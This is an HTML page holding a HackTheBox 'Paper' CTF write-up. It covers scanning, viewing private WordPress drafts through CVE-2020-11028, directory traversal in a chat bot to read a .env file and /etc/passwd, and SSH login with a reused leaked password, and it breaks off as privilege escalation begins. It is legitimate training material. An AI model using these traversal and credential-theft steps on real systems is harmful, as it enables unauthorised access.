@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l&#43;G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1&#43;U35bzlInU7AVC9HUW6IbAq&#43;VNlbXLrzBCbIO&#43;l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy&#43;xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F&#43;B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg= | 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX 80/tcp open http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 |_http-title: HTTP Server Test Page powered by CentOS | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE 443/tcp open ssl/http syn-ack Apache httpd 2." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/paper/paper/" />
+
+
+    <title>
+        
+            Paper :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Paper">
+<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l&#43;G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1&#43;U35bzlInU7AVC9HUW6IbAq&#43;VNlbXLrzBCbIO&#43;l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy&#43;xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F&#43;B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg= | 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX 80/tcp open http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 |_http-title: HTTP Server Test Page powered by CentOS | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE 443/tcp open ssl/http syn-ack Apache httpd 2."><meta itemprop="datePublished" content="2022-09-20T15:03:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T15:03:31+01:00" />
+<meta itemprop="wordCount" content="1784"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Paper"/>
+<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l&#43;G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1&#43;U35bzlInU7AVC9HUW6IbAq&#43;VNlbXLrzBCbIO&#43;l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy&#43;xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F&#43;B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg= | 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX 80/tcp open http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 |_http-title: HTTP Server Test Page powered by CentOS | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE 443/tcp open ssl/http syn-ack Apache httpd 2."/>
+
+
+
+    <meta property="og:title" content="Paper" />
+<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l&#43;G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1&#43;U35bzlInU7AVC9HUW6IbAq&#43;VNlbXLrzBCbIO&#43;l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy&#43;xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F&#43;B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg= | 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX 80/tcp open http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 |_http-title: HTTP Server Test Page powered by CentOS | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE 443/tcp open ssl/http syn-ack Apache httpd 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/paper/paper/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T15:03:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T15:03:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="HackTheBox" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 15:03:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/paper/paper/">Paper</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT    STATE SERVICE  REASON  VERSION
+22/tcp  open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
+|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
+
+80/tcp  open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+
+443/tcp open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
+| Subject Alternative Name: DNS:localhost.localdomain
+| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-3899279223185377061/emailAddress=root@localhost.localdomain
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-07-03T08:52:34
+| Not valid after:  2022-07-08T10:32:34
+| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
+| SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
+| -----BEGIN CERTIFICATE-----
+| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
+| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3
+| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
+| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3
+| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
+| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
+| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/3n1pZvFgeX1ja/w84jNxT2NcBkux
+| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm
+| 4WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+
+| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+3P08fPsC0/5YvgkV
+| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++1aDkIhAhbA
+| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg
+| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
+| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+7ffA
+| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/5kXBGn8kfJZ45hP
+| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+9PV9/SNCEJVTMy+LDQ
+| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh
+| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/2VlGaT
+| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc
+| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS
+| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+9lzCFBiNzPLsV6vrTXCh7t9Cx07
+| 9jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl
+| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa
+| OfcJ7Tl0ovWa+c9lWNju5mgdU+0v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1
+| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4
+| mh/ptg==
+|_-----END CERTIFICATE-----
+</code></pre><h3 id="gobuster">Gobuster</h3>
+<pre tabindex="0"><code>/.hta                 (Status: 403) [Size: 199]
+/.htaccess            (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/cgi-bin/             (Status: 403) [Size: 199]
+/manual               (Status: 301) [Size: 237] [--&gt; http://10.129.148.234/manual/]
+
+
+/.hta                 (Status: 403) [Size: 199]
+/.htaccess            (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/developer            (Status: 301) [Size: 247] [--&gt; http://10.129.148.234/manual/developer/]
+/faq                  (Status: 301) [Size: 241] [--&gt; http://10.129.148.234/manual/faq/]      
+/howto                (Status: 301) [Size: 243] [--&gt; http://10.129.148.234/manual/howto/]    
+/images               (Status: 301) [Size: 244] [--&gt; http://10.129.148.234/manual/images/]   
+/index.html           (Status: 200) [Size: 9164]                                             
+/LICENSE              (Status: 200) [Size: 11358]                                            
+/misc                 (Status: 301) [Size: 242] [--&gt; http://10.129.148.234/manual/misc/]     
+/mod                  (Status: 301) [Size: 241] [--&gt; http://10.129.148.234/manual/mod/]      
+/programs             (Status: 301) [Size: 246] [--&gt; http://10.129.148.234/manual/programs/] 
+/ssl                  (Status: 301) [Size: 241] [--&gt; http://10.129.148.234/manual/ssl/]      
+/style                (Status: 301) [Size: 243] [--&gt; http://10.129.148.234/manual/style/] 
+</code></pre><p>AS I don&rsquo;t trust hackthebox alot I added nikto to my enumeration process</p>
+<h3 id="nikto">nikto</h3>
+<pre tabindex="0"><code>---------------------------------------------------------------------------
++ Target IP:          10.129.148.234
++ Target Hostname:    10.129.148.234
++ Target Port:        80
++ Start Time:         2022-02-06 19:39:30 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;x-backend-server&#39; found, with contents: office.paper
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/7.2.24
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8743 requests: 12 error(s) and 11 item(s) reported on remote host
++ End Time:           2022-02-06 20:19:30 (GMT1) (2400 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre><p>Indeed! there is a hint now! x-backend-server suggest a domain name</p>
+<p>I add <code>office.paper</code> to my <code>/etc/hosts</code> and can access the real website (instead of server manual)</p>
+<p>Damn I love &ldquo;the office&rdquo;</p>
+<pre tabindex="0"><code>Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
+-Nick
+</code></pre><p>As it is proudly powered by wordpress I go for a wpscan</p>
+<pre tabindex="0"><code>+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ |  - X-Powered-By: PHP/7.2.24
+ |  - X-Backend-Server: office.paper
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://office.paper/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
+ |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
+
+[+] WordPress theme in use: construction-techup
+ | Location: http://office.paper/wp-content/themes/construction-techup/
+ | Last Updated: 2021-07-17T00:00:00.000Z
+ | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
+ | [!] The version is out of date, the latest version is 1.4
+ | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
+ | Style Name: Construction Techup
+ | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
+ | Author: wptexture
+ | Author URI: https://testerwp.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39;
+
+ [i] User(s) Identified:
+
+[+] prisonmike
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] nick
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] creedthoughts
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+</code></pre><p>I also found alot of wordpress vulnerablities for this version</p>
+<p>but this one is relevant to Nick&rsquo;s comment</p>
+<pre tabindex="0"><code> | [!] Title: WordPress &lt; 5.4.1 - Unauthenticated Users View Private Posts
+ |     Fixed in: 5.2.6
+ |     References:
+ |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
+ |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
+ |      - https://core.trac.wordpress.org/changeset/47635/
+ |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
+ |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
+</code></pre><p>Google it to understand this <code>http://office.paper/?static=1</code></p>
+<pre tabindex="0"><code>
+
+# Warning for Michael
+
+Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
+
+Threat Level Midnight
+
+A MOTION PICTURE SCREENPLAY,
+WRITTEN AND DIRECTED BY
+MICHAEL SCOTT
+
+[INT:DAY]
+
+Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!
+</code></pre><p>Add the new subdomain to your hosts and register to the given address</p>
+<p><code>Rocketchat</code> looks cool</p>
+<p>In the general chat you learn about <code>recyclops</code></p>
+<p>its a cool bot designed by dwight, and it takes commands</p>
+<pre tabindex="0"><code>...
+
+ &lt;=====The following two features are for those boneheads, who still don&#39;t know how to use scp. I&#39;m Looking at you Kevin.=====&gt;
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: &#39;recyclops get me the file test.txt&#39;, or &#39;recyclops could you send me the file sale/secret.xls&#39; or just &#39;recyclops file test.txt&#39;
+4. List:
+You can ask me to list the files
+eg: &#39;recyclops i need directory list sale&#39; or just &#39;recyclops list sale&#39;
+
+...
+</code></pre><p>Lmao the bot says listing is limited to the sales folder</p>
+<p>But actually no filter is present for classic directory trasversal</p>
+<p>Just combine <code>../</code> with <code>list</code> and then <code>file</code> command</p>
+<p>As much as needed!</p>
+<p>ok I was mad confused when <code>.ssh</code> folder was empty but hey we love enumerating</p>
+<p>so&hellip;in the <code>hubot</code> folder</p>
+<pre tabindex="0"><code> &lt;!=====Contents of file ../hubot/.env=====&gt;
+export ROCKETCHAT_URL=&#39;http://127.0.0.1:48320&#39;
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+&lt;!=====End of file ../hubot/.env=====&gt;
+</code></pre><p>First i tried to ssh as &ldquo;recyclops:Queenofblad3s!23&rdquo;</p>
+<p>But it didnt work&hellip;wich confuses a bit more</p>
+<p>But hey remember we can read /etc/passwd too</p>
+<p>I check and there is a <code>dwight</code> user&hellip;and wo owns recyclops?</p>
+<p>Yeah that&rsquo;s right <code>dwight:Queenofblad3s!23</code></p>
+<pre tabindex="0"><code>└──╼ $ssh dwight@10.129.148.234
+dwight@10.129.148.234&#39;s password: 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+
+[dwight@paper ~]$ cat user.txt
+dwight_you_ignorant_time_thief
+</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
+<pre tabindex="0"><code>...
+
+Sorry, user dwight may not run sudo on paper.
+[dwight@paper ~]$ find / -perm -u=s 2&gt;/dev/null
+/usr/bin/fusermount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/fusermount3
